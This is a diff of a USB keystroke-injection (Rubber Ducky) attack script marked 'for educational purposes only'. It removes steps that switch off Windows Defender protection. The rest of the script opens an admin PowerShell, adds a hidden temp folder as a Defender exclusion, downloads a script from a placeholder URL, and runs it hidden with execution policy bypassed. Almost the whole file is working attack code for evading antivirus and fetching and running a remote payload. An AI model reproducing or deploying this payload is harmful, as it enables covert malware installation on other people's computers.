@@ -11,25 +11,6 @@ REM This script is for educational purposes only
 
 REM Delay To Enumerate Ducky
 Delay 2000
-REM Disable WinDefend
-Gui
-Delay 300
-String Virus & Threat Protection
-Delay 300
-Enter 
-Delay 3000
-Tab
-Tab
-Tab
-Tab
-Delay 300
-Enter
-Delay 300
-Space
-Delay 500
-Alt + Y
-Delay 500
-Alt + F4
 REM Launch Powershell As Admin
 GUI
 STRING powershell
@@ -41,4 +22,3 @@ DELAY 1000
 REM Create New Folder With Exclusion And Launch Script Hidden
 STRING mkdir "$env:temp\XDE"; Add-MpPreference -ExclusionPath "$env:temp\XDE"; powershell -NoP -NonI -W h -Exec Bypass iwr "DOWNLOAD-URL" -outfile "$env:temp\XDE\mail.ps1"; cd $env:temp\XDE; & .\mail.ps1
 ENTER
-
